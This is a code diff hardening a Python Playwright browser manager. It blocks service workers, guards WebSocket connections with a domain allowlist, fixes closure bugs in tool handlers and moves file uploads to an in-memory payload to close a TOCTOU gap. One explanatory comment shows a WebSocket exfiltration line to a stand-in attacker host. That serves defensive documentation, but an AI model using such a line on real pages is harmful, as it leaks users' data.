@@ -24,10 +24,12 @@ H5: the context key is ``principal_id + session_id + runtime_id`` (not just
 under the same UID get independent contexts and one session's
 ``RuntimeResult.aclose`` cannot close another session's page.
 
-H6: ``browser_file_upload`` validates the file's identity (inode + size +
-dev) at ``open()`` time, copies the bytes into a runtime-private temp file
-owned by the current user (0600), and hands Playwright the temp path — so a
-TOCTOU swap between validation and upload cannot substitute different bytes.
+M1: ``browser_file_upload`` validates the file's identity (inode + size +
+owner) at ``open()`` time, reads the bytes fully into memory, and hands
+Playwright the bytes via its in-memory payload API
+(``files=[{"name": ..., "mimeType": ..., "buffer": bytes}]``) — no temp
+file is ever created, so there is no TOCTOU window for a same-UID process
+to substitute different bytes between validation and upload.
 """
 
 from __future__ import annotations
@@ -36,7 +38,6 @@ import base64
 import logging
 import os
 import re
-import tempfile
 import uuid
 from dataclasses import dataclass, field
 from pathlib import Path
@@ -385,6 +386,15 @@ class BrowserManager:
         context = await self._browser.new_context(
             viewport={"width": 1280, "height": 720},
             user_agent="KhaosBrowser/1.0",
+            # B2: block service workers so they cannot intercept requests
+            # and bypass the route guard.  Per Playwright docs, requests
+            # handled by a service worker are NOT seen by
+            # ``context.route()`` — so a page that registers a service
+            # worker could then issue network requests the guard never
+            # observes.  ``service_workers="block"`` makes Playwright
+            # itself refuse service worker registration, closing the
+            # bypass at the browser layer.
+            service_workers="block",
         )
         # B2: install the route interceptor BEFORE creating the page so the
         # very first navigation is gated.  The interceptor runs the
@@ -517,6 +527,64 @@ class BrowserManager:
         # returns None.  Never continue with an unguarded context.
         await context.route("**/*", _route_handler)
 
+        # B2: WebSocket bypass closure.  ``context.route()`` does NOT
+        # intercept WebSocket connections — a page could open
+        # ``new WebSocket("wss://evil.example/leak")`` to exfiltrate data
+        # past the HTTP route guard.  ``route_web_socket()`` (Playwright
+        # >=1.48) registers a separate handler for WebSocket upgrades so
+        # the same domain allowlist applies.  We probe for the method
+        # at runtime so older Playwright builds fail closed with a clear
+        # error instead of silently allowing WebSockets.
+        #
+        # NOTE: ``route_web_socket``'s handler signature is
+        # ``(websocket_route)`` — NOT ``(route, request)`` like
+        # ``context.route()``.  The ``WebSocketRoute`` object exposes
+        # ``.request`` (with ``.url``) and ``.abort()`` / ``.continue_()``.
+        if not hasattr(context, "route_web_socket"):
+            raise RuntimeError(
+                "Playwright build is too old to enforce the WebSocket "
+                "route guard — install playwright>=1.48 and run "
+                "'playwright install chromium'.  Refusing to create an "
+                "unguarded context."
+            )
+
+        async def _ws_handler(ws_route: Any) -> None:
+            try:
+                # ``WebSocketRoute`` exposes ``.url`` directly (unlike
+                # ``Route`` which exposes ``.request.url``).  It also
+                # uses ``close()`` instead of ``abort()`` to reject the
+                # connection — calling ``abort`` raises AttributeError
+                # which would let the WS through.
+                url = ws_route.url
+                # ws:// and wss:// are the only WebSocket schemes; reject
+                # anything else (defensive — Playwright should never
+                # surface a non-ws URL here).
+                lower_url = url.lower()
+                if not (lower_url.startswith("ws://") or lower_url.startswith("wss://")):
+                    await ws_route.close(code=1008, reason="blocked by guard")
+                    return
+                parsed = urlparse(url)
+                domain = parsed.hostname or ""
+                if domain:
+                    result = guard._check_domain(domain)
+                    if not result.allowed:
+                        await ws_route.close(code=1008, reason="blocked by guard")
+                        logger.info(
+                            "B2 ws route guard blocked WebSocket to %s: %s",
+                            domain, result.reason,
+                        )
+                        return
+                await ws_route.continue_()
+            except Exception as exc:  # noqa: BLE001 — never let the
+                # handler raise into Playwright.
+                logger.warning("B2 ws route guard error: %s", exc)
+                try:
+                    await ws_route.close(code=1011, reason="guard error")
+                except Exception:  # noqa: BLE001
+                    pass
+
+        await context.route_web_socket("**/*", _ws_handler)
+
     async def _safe_execute(
         self,
         real: Callable[[Page], Any],
@@ -623,7 +691,7 @@ async def browser_navigate(
     subresource — not just the initial URL.
     """
     return await _manager._safe_execute(
-        real=_navigate_real,
+        real=_make_navigate_real(url),
         mock=lambda: _navigate_mock(url),
         principal_id=principal_id,
         session_id=session_id,
@@ -632,13 +700,20 @@ async def browser_navigate(
     )
 
 
-def _navigate_real(page: Page) -> Any:
-    async def _run() -> dict[str, Any]:
+def _make_navigate_real(url: str):
+    """B1: factory that binds ``url`` into the real handler's closure.
+
+    The previous ``_navigate_real(page)`` referenced ``url`` from the
+    enclosing ``browser_navigate`` scope, but ``_safe_execute`` calls
+    ``real(page)`` from a different call frame — so ``url`` was undefined
+    and every real navigation raised ``NameError`` at runtime.  The mock
+    tests pinned ``_HAS_PLAYWRIGHT = False`` so this was never caught.
+    """
+    async def _run(page: Page) -> dict[str, Any]:
         await page.goto(url, wait_until="domcontentloaded", timeout=30000)
         title = await page.title()
         return {"ok": True, "url": page.url, "title": title}
-
-    return _run()
+    return _run
 
 
 def _navigate_mock(url: str) -> dict[str, Any]:
@@ -659,7 +734,7 @@ async def browser_click(
     bypass).
     """
     return await _manager._safe_execute(
-        real=_click_real,
+        real=_make_click_real(selector),
         mock=lambda: _click_mock(selector),
         principal_id=principal_id,
         session_id=session_id,
@@ -668,16 +743,16 @@ async def browser_click(
     )
 
 
-def _click_real(page: Page) -> Any:
-    async def _run() -> dict[str, Any]:
+def _make_click_real(selector: str):
+    """B1: factory that binds ``selector`` into the real handler's closure."""
+    async def _run(page: Page) -> dict[str, Any]:
         await page.click(selector, timeout=10000)
         try:
             await page.wait_for_load_state("domcontentloaded", timeout=5000)
         except Exception:  # noqa: BLE001 — 点击可能不触发导航，忽略超时
             pass
         return {"ok": True, "selector": selector, "url": page.url}
-
-    return _run()
+    return _run
 
 
 def _click_mock(selector: str) -> dict[str, Any]:
@@ -699,7 +774,7 @@ async def browser_type(
     bypass).
     """
     return await _manager._safe_execute(
-        real=_type_real,
+        real=_make_type_real(selector, text, press_enter),
         mock=lambda: _type_mock(selector, text),
         principal_id=principal_id,
         session_id=session_id,
@@ -708,14 +783,16 @@ async def browser_type(
     )
 
 
-def _type_real(page: Page) -> Any:
-    async def _run() -> dict[str, Any]:
+def _make_type_real(selector: str, text: str, press_enter: bool):
+    """B1: factory that binds ``selector`` / ``text`` / ``press_enter``
+    into the real handler's closure.
+    """
+    async def _run(page: Page) -> dict[str, Any]:
         await page.fill(selector, text)
         if press_enter:
             await page.press(selector, "Enter")
         return {"ok": True, "selector": selector, "text": text}
-
-    return _run()
+    return _run
 
 
 def _type_mock(selector: str, text: str) -> dict[str, Any]:
@@ -775,7 +852,7 @@ async def browser_screenshot(
     B2: ``network_guard`` is installed on the context.
     """
     return await _manager._safe_execute(
-        real=_screenshot_real,
+        real=_make_screenshot_real(save_path),
         mock=_screenshot_mock,
         principal_id=principal_id,
         session_id=session_id,
@@ -784,8 +861,9 @@ async def browser_screenshot(
     )
 
 
-def _screenshot_real(page: Page) -> Any:
-    async def _run() -> dict[str, Any]:
+def _make_screenshot_real(save_path: str):
+    """B1: factory that binds ``save_path`` into the real handler's closure."""
+    async def _run(page: Page) -> dict[str, Any]:
         if save_path:
             await page.screenshot(path=save_path, full_page=False)
             import os
@@ -795,8 +873,7 @@ def _screenshot_real(page: Page) -> Any:
         image_bytes = await page.screenshot(full_page=False)
         encoded = base64.b64encode(image_bytes).decode("ascii")
         return {"ok": True, "base64": encoded, "size_bytes": len(image_bytes)}
-
-    return _run()
+    return _run
 
 
 def _screenshot_mock() -> dict[str, Any]:
@@ -814,7 +891,7 @@ async def browser_scroll(
     B2: ``network_guard`` is installed on the context.
     """
     return await _manager._safe_execute(
-        real=_scroll_real,
+        real=_make_scroll_real(direction, amount),
         mock=lambda: _scroll_mock(direction, amount),
         principal_id=principal_id,
         session_id=session_id,
@@ -823,15 +900,17 @@ async def browser_scroll(
     )
 
 
-def _scroll_real(page: Page) -> Any:
-    async def _run() -> dict[str, Any]:
+def _make_scroll_real(direction: str, amount: int):
+    """B1: factory that binds ``direction`` / ``amount`` into the real
+    handler's closure.
+    """
+    async def _run(page: Page) -> dict[str, Any]:
         pixels = amount * 500
         if direction == "up":
             pixels = -pixels
         await page.evaluate(f"window.scrollBy(0, {pixels})")
         return {"ok": True, "direction": direction, "amount": amount}
-
-    return _run()
+    return _run
 
 
 def _scroll_mock(direction: str, amount: int) -> dict[str, Any]:
@@ -854,7 +933,7 @@ async def browser_evaluate(
     if blocked:
         return {"ok": False, "error": blocked}
     return await _manager._safe_execute(
-        real=_evaluate_real,
+        real=_make_evaluate_real(expression),
         mock=lambda: {"ok": False, "error": "JS evaluation not available in mock mode"},
         principal_id=principal_id,
         session_id=session_id,
@@ -863,12 +942,12 @@ async def browser_evaluate(
     )
 
 
-def _evaluate_real(page: Page) -> Any:
-    async def _run() -> dict[str, Any]:
+def _make_evaluate_real(expression: str):
+    """B1: factory that binds ``expression`` into the real handler's closure."""
+    async def _run(page: Page) -> dict[str, Any]:
         result = await page.evaluate(expression)
         return {"ok": True, "result": str(result)}
-
-    return _run()
+    return _run
 
 
 async def browser_file_upload(
@@ -891,12 +970,12 @@ async def browser_file_upload(
     tool declares ``network.access``; the handler rejects when network is
     not enabled (defense in depth).
 
-    H6: the file is opened with ``O_RDONLY | O_NOFOLLOW`` and its bytes
-    are copied into a runtime-private temp file (0600, fixed inode).
-    Playwright receives the temp path, NOT the original — so a TOCTOU
-    swap of the original file between validation and upload cannot
-    substitute different bytes.  The temp file is unlinked after the
-    upload completes (success or failure).
+    M1: the file is opened with ``O_RDONLY | O_NOFOLLOW`` and its bytes
+    are read fully into memory.  Playwright receives the bytes via its
+    in-memory payload API (``files=[{"name": ..., "mimeType": ...,
+    "buffer": bytes}]``) — no temp file is ever created, so there is no
+    TOCTOU window for a same-UID process to substitute different bytes
+    between validation and upload.
 
     H1: ``principal_id`` selects the per-principal ``BrowserContext`` so
     the upload targets the caller's own page, not a shared pool.
@@ -916,30 +995,24 @@ async def browser_file_upload(
             "ok": False,
             "error": "browser_file_upload requires a workspace root for path validation",
         }
-    # H6: materialize a runtime-private copy with fd-based identity
-    # binding.  Returns an error dict on failure or the temp Path on
-    # success.  The temp file has a fixed inode — Playwright reads from
-    # it, not the original, so a TOCTOU swap of the original cannot
-    # substitute different bytes.
-    materialized = _materialize_upload(file_path, workspace_root)
-    if isinstance(materialized, dict):
-        return materialized
-    temp_path = materialized
-    try:
-        return await _manager._safe_execute(
-            real=_make_file_upload_real(selector, str(temp_path), file_path),
-            mock=lambda: _file_upload_mock(selector, file_path),
-            principal_id=principal_id,
-            session_id=session_id,
-            runtime_id=runtime_id,
-            network_guard=network_guard,
-        )
-    finally:
-        # H6: best-effort cleanup of the runtime-private temp copy.
-        try:
-            temp_path.unlink(missing_ok=True)
-        except Exception:  # noqa: BLE001 — best-effort cleanup
-            pass
+    # M1: read the source file bytes into memory via fd-based identity
+    # binding.  Returns an error dict on failure or a (bytes, basename)
+    # tuple on success.  Playwright's ``set_input_files`` accepts an
+    # in-memory payload, so no temp file is ever created and there is
+    # no TOCTOU window for a same-UID process to substitute different
+    # bytes between validation and upload.
+    read_result = _read_upload_bytes(file_path, workspace_root)
+    if isinstance(read_result, dict):
+        return read_result
+    file_bytes, file_name = read_result
+    return await _manager._safe_execute(
+        real=_make_file_upload_real(selector, file_name, file_bytes),
+        mock=lambda: _file_upload_mock(selector, file_path),
+        principal_id=principal_id,
+        session_id=session_id,
+        runtime_id=runtime_id,
+        network_guard=network_guard,
+    )
 
 
 # B1: maximum upload file size — 10 MiB.  Large enough for documents and
@@ -947,59 +1020,14 @@ async def browser_file_upload(
 # channel.
 _UPLOAD_MAX_BYTES = 10 * 1024 * 1024
 
-# M1: runtime-private directory for materialized upload temp files.
-# ``tempfile.mkstemp()`` defaults to the system ``/tmp`` which is
-# world-writable on the same UID — a same-UID process can swap the file
-# between ``close(temp_fd)`` and Playwright's ``open()`` (TOCTOU).  Using
-# a 0700 dir under the user's home closes that window: only the current
-# user can access the temp file.  ``_ensure_upload_trusted_dir`` validates
-# this directory (not a symlink, owned by current UID, mode 0700) before
-# any temp file is created in it.
-UPLOAD_TRUSTED_DIR = Path.home() / ".khaos" / "uploads"
-
-
-def _ensure_upload_trusted_dir() -> Path:
-    """M1: ensure ``UPLOAD_TRUSTED_DIR`` exists and is a 0700 directory
-    owned by the current user.
-
-    Validates the directory is:
-
-    * not a symlink (so an attacker cannot point ``~/.khaos/uploads`` at
-      ``/etc`` or another world-readable location);
-    * a real directory (not a regular file, device, etc.);
-    * owned by the current UID (so another user's directory cannot be
-      used to leak or substitute temp files);
-    * mode 0700 (no group / other access — only the owner can read,
-      write or list the directory).
-
-    The directory is created with mode 0700 if it does not exist, and
-    ``chmod(0o700)`` is applied unconditionally (idempotent) to close
-    any umask leak (e.g. ``mkdir`` under umask 022 would create 0755).
-    Returns the validated ``Path`` on success; raises ``OSError`` on
-    validation failure.
-    """
-    import os as _os
-    import stat as _stat
-
-    path = UPLOAD_TRUSTED_DIR
-    path.mkdir(parents=True, exist_ok=True)
-    # lstat (not stat / follow) so a symlink at ``path`` is detected
-    # rather than transparently followed.
-    st = path.lstat()
-    if _stat.S_ISLNK(st.st_mode):
-        raise OSError(f"upload trusted dir is a symlink: {path}")
-    if not _stat.S_ISDIR(st.st_mode):
-        raise OSError(f"upload trusted dir is not a directory: {path}")
-    if st.st_uid != _os.getuid():
-        raise OSError(
-            f"upload trusted dir not owned by current user (uid="
-            f"{_os.getuid()}): {path}"
-        )
-    # Force 0700 (idempotent) — closes any umask leak from a prior
-    # ``mkdir`` under a permissive umask.  This is safe because chmod
-    # follows symlinks and we already rejected symlinks above.
-    _os.chmod(path, 0o700)
-    return path
+# M1: in-memory upload payload — no temp file, no TOCTOU window.  The
+# previous flow materialized a runtime-private temp file in a 0700 dir
+# under ``~/.khaos/uploads/`` and handed Playwright the temp PATH.  A
+# same-UID process could still scan the 0700 directory, replace the temp
+# file between ``close(temp_fd)`` and Playwright's ``open()``, and
+# substitute different bytes (TOCTOU).  Reading the bytes into memory
+# and passing them via Playwright's ``files=[{..., "buffer": bytes}]``
+# payload API closes that window entirely.
 
 
 def _validate_upload_path(file_path: str, workspace_root: str) -> dict[str, Any] | None:
@@ -1008,10 +1036,9 @@ def _validate_upload_path(file_path: str, workspace_root: str) -> dict[str, Any]
     B1: returns an error dict when validation fails, or ``None`` when the
     path is safe to upload.  Uses ``Path.resolve(strict=True)`` so symlink
     escape is rejected — the resolved path must be a real file inside the
-    resolved workspace root.  This is the *fast* validation path used by
-    tests; the actual upload path uses ``_materialize_upload`` (H6) which
-    re-validates AND copies the bytes into a runtime-private temp file
-    with fd-based identity binding.
+    resolved workspace root.  This is the *fast* validation path; the
+    actual upload path uses ``_read_upload_bytes`` (M1) which re-validates
+    AND reads the bytes into memory with fd-based identity binding.
     """
     from pathlib import Path
 
@@ -1059,48 +1086,39 @@ def _validate_upload_path(file_path: str, workspace_root: str) -> dict[str, Any]
     return None
 
 
-def _materialize_upload(
+def _read_upload_bytes(
     file_path: str, workspace_root: str
-) -> "Path | dict[str, Any]":
-    """H6: validate the upload path AND materialize a runtime-private copy.
+) -> "tuple[bytes, str] | dict[str, Any]":
+    """M1: validate the upload path AND read the bytes into memory.
 
-    The previous ``_validate_upload_path`` → ``page.set_input_files(path)``
-    flow had a TOCTOU window: between ``Path.resolve(strict=True)`` /
-    ``is_file()`` / ``stat()`` returning and Playwright opening the path,
-    a same-UID concurrent process could replace the file with different
-    bytes (or a symlink, on kernels where the path was not opened with
-    ``O_NOFOLLOW``).
+    The previous flow (``_materialize_upload``) copied the bytes into a
+    runtime-private temp file in ``~/.khaos/uploads/`` (0700) and handed
+    Playwright the temp PATH.  A same-UID process could still scan the
+    0700 directory, replace the temp file between ``close(temp_fd)`` and
+    Playwright's ``open()``, and substitute different bytes (TOCTOU).
 
-    This function closes that window by:
+    This function closes that window by reading the bytes fully into
+    memory and returning them as a ``bytes`` object.  Playwright's
+    ``set_input_files`` accepts an in-memory payload
+    (``files=[{"name": ..., "mimeType": ..., "buffer": bytes}]``), so
+    no temp file is ever created and there is no TOCTOU window.
 
-    * opening the resolved target with ``O_RDONLY | O_NOFOLLOW`` so a
-      symlink at the target is rejected and the file's identity (inode +
-      dev) is pinned for the duration of the copy;
-    * validating with ``fstat`` that it is a regular file owned by the
+    The function:
+
+    * reuses ``_validate_upload_path`` for fast containment / size checks;
+    * re-resolves the target path;
+    * opens it with ``O_RDONLY | O_NOFOLLOW`` (rejects symlinks, pins
+      the inode for the duration of the read);
+    * validates with ``fstat`` that it is a regular file owned by the
       current user and under the size limit;
-    * copying the bytes (from the open fd, NOT from the path) into a
-      runtime-private temp file created with ``mkstemp`` and ``fchmod 0600``;
-    * returning the temp ``Path`` — Playwright reads from this temp file,
-      so a subsequent swap of the original cannot affect the upload.
+    * reads the bytes in chunks, enforcing the size limit DURING the
+      read (a file could grow between ``fstat`` and ``read``);
+    * closes the source fd immediately (before returning).
 
-    M1: the temp file is created inside ``UPLOAD_TRUSTED_DIR`` (a 0700
-    directory under ``~/.khaos/uploads/``), NOT the system ``/tmp``.
-    ``/tmp`` is world-writable on the same UID, so a same-UID process
-    could swap the temp file between ``close(temp_fd)`` and Playwright's
-    ``open()``.  The 0700 dir closes that window: only the current user
-    can access the temp file.
-
-    M1: on ANY error path that returns a dict (after the temp file has
-    been created), the temp file is unlinked in the ``finally`` block so
-    partial / failed materializations do not leak runtime-private temp
-    files into ``~/.khaos/uploads/``.  On the success path the caller is
-    responsible for unlinking after Playwright finishes.
-
-    Returns the temp ``Path`` on success, or an error dict on failure.
+    Returns ``(bytes, basename)`` on success, or an error dict on failure.
     """
     import os as _os
     import stat as _stat
-    import tempfile as _tempfile
 
     # Reuse the fast validation path for the early containment / size
     # checks (so the error dicts match the test expectations).
@@ -1119,8 +1137,8 @@ def _materialize_upload(
             "file": file_path,
         }
 
-    # H6: open with O_RDONLY | O_NOFOLLOW so a symlink at the target is
-    # rejected and the file's identity is pinned for the copy.
+    # M1: open with O_RDONLY | O_NOFOLLOW so a symlink at the target is
+    # rejected and the file's identity is pinned for the read.
     try:
         src_fd = _os.open(str(target_resolved), _os.O_RDONLY | _os.O_NOFOLLOW)
     except OSError as exc:
@@ -1130,13 +1148,6 @@ def _materialize_upload(
             "file": file_path,
         }
 
-    temp_path_str: str | None = None
-    # M1: ``temp_handed_off`` is set to True ONLY on the success path,
-    # so the ``finally`` block can unlink the temp file when we are
-    # about to return an error dict (i.e. the temp file was created but
-    # is partial / failed validation and the caller will never receive
-    # the Path to clean up themselves).
-    temp_handed_off = False
     try:
         st = _os.fstat(src_fd)
         if not _stat.S_ISREG(st.st_mode):
@@ -1161,110 +1172,60 @@ def _materialize_upload(
                 "file": file_path,
                 "size": st.st_size,
             }
-        # M1: validate the trusted upload dir before creating any temp
-        # file in it.  Raises OSError on validation failure — propagated
-        # to the caller as an error dict below.
-        try:
-            trusted_dir = _ensure_upload_trusted_dir()
-        except OSError as exc:
-            return {
-                "ok": False,
-                "error": f"upload trusted dir validation failed: {exc}",
-                "file": file_path,
-            }
-        # Create the runtime-private temp file (0600, current user) in
-        # the validated 0700 trusted dir.  mkstemp opens the file with
-        # O_RDWR | O_CREAT | O_EXCL, so the temp path is unique and not
-        # pre-existing.  M1: passing ``dir=str(trusted_dir)`` ensures
-        # the temp file lands in the 0700 dir, NOT in the world-writable
-        # system /tmp.
-        temp_fd, temp_path_str = _tempfile.mkstemp(
-            prefix="khaos_upload_",
-            suffix=target_resolved.suffix or ".bin",
-            dir=str(trusted_dir),
-        )
-        try:
-            _os.fchmod(temp_fd, 0o600)
-            # Copy from src_fd to temp_fd in chunks.  We read from the
-            # OPEN FD, not from the path — so a concurrent swap of the
-            # original file cannot substitute different bytes.
-            chunk_size = 64 * 1024
-            remaining = st.st_size
-            while remaining > 0:
-                chunk = _os.read(src_fd, min(chunk_size, remaining))
-                if not chunk:
-                    # File shrank between fstat and read — abort.  The
-                    # temp file is partial; ``temp_handed_off`` is still
-                    # False so the ``finally`` block below will unlink it.
-                    return {
-                        "ok": False,
-                        "error": "file shrank during upload materialization",
-                        "file": file_path,
-                    }
-                _os.write(temp_fd, chunk)
-                remaining -= len(chunk)
-            # Verify the temp file's identity before handing to Playwright.
-            temp_st = _os.fstat(temp_fd)
-            if not _stat.S_ISREG(temp_st.st_mode):
+        # Read the bytes in chunks, enforcing the size limit DURING the
+        # read.  A file could grow between fstat and read; we abort if
+        # the running total exceeds the limit.
+        chunk_size = 64 * 1024
+        chunks: list[bytes] = []
+        total = 0
+        while True:
+            chunk = _os.read(src_fd, chunk_size)
+            if not chunk:
+                break
+            total += len(chunk)
+            if total > _UPLOAD_MAX_BYTES:
                 return {
                     "ok": False,
-                    "error": "temp file is not a regular file",
+                    "error": (
+                        f"file size exceeded the upload limit of "
+                        f"{_UPLOAD_MAX_BYTES} bytes during read"
+                    ),
                     "file": file_path,
                 }
-            if temp_st.st_uid != _os.getuid():
-                return {
-                    "ok": False,
-                    "error": "temp file is not owned by the current user",
-                    "file": file_path,
-                }
-            if temp_st.st_mode & 0o077:
-                return {
-                    "ok": False,
-                    "error": "temp file has unsafe permissions",
-                    "file": file_path,
-                }
-        finally:
-            _os.close(temp_fd)
-        # Success — mark the temp file as handed off so the outer
-        # ``finally`` does NOT unlink it (the caller unlinks after
-        # Playwright finishes).
-        temp_handed_off = True
-        return Path(temp_path_str)
+            chunks.append(chunk)
+        file_bytes = b"".join(chunks)
     finally:
         _os.close(src_fd)
-        # M1: unlink the temp file on EVERY error path.  If we created a
-        # temp file but returned an error dict (validation failure mid-
-        # copy, identity check failure, etc.), the caller never received
-        # the Path and cannot clean it up themselves — so we unlink here.
-        # On the success path ``temp_handed_off`` is True and the temp
-        # file is left for the caller to unlink after Playwright finishes.
-        if temp_path_str is not None and not temp_handed_off:
-            try:
-                _os.unlink(temp_path_str)
-            except OSError:  # noqa: BLE001 — best-effort cleanup
-                pass
+    return file_bytes, target_resolved.name
 
 
 def _make_file_upload_real(
-    selector: str, upload_path: str, original_path: str
+    selector: str, file_name: str, file_bytes: bytes
 ) -> Callable[[Page], Any]:
-    """Build a ``real`` closure for ``browser_file_upload`` that uploads
-    from the materialized temp path (H6) but reports the original path
-    in the result dict (so the caller sees what they asked to upload,
-    not the runtime-private temp copy).
+    """M1: factory that binds ``file_name`` / ``file_bytes`` into the
+    real handler's closure.
+
+    The bytes are uploaded via Playwright's in-memory payload API
+    (``files=[{"name": ..., "mimeType": ..., "buffer": bytes}]``) — no
+    temp file, no TOCTOU window for a same-UID process to substitute
+    different bytes between validation and upload.
     """
-    def _real(page: Page) -> Any:
-        async def _run() -> dict[str, Any]:
-            await page.set_input_files(selector, upload_path)
-            return {
-                "ok": True,
-                "selector": selector,
-                "file": original_path,
-                # H6: include the temp path for auditability.
-                "materialized_path": upload_path,
-            }
-        return _run()
-    return _real
+    async def _run(page: Page) -> dict[str, Any]:
+        await page.set_input_files(
+            selector,
+            files=[{
+                "name": file_name,
+                "mimeType": "application/octet-stream",
+                "buffer": file_bytes,
+            }],
+        )
+        return {
+            "ok": True,
+            "selector": selector,
+            "file": file_name,
+            "size_bytes": len(file_bytes),
+        }
+    return _run
 
 
 def _file_upload_real(page: Page) -> Any:  # pragma: no cover - legacy
